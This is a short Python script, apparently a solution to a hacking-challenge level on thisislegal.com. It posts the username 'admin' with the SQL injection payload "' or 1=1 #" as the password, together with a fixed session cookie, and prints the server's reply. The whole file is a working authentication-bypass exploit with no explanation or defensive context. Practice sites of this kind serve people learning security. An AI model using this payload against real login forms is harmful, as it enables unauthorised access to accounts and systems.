import requests

cookies = {"PHPSESSID": "cio9psl54ibs86mphns9c4tbr7"}
url = "https://thisislegal.com/real2/login2.php"
data = {"username": "admin", "password": "' or 1=1 #"}
r = requests.post(url, cookies=cookies, data=data)
print r.text
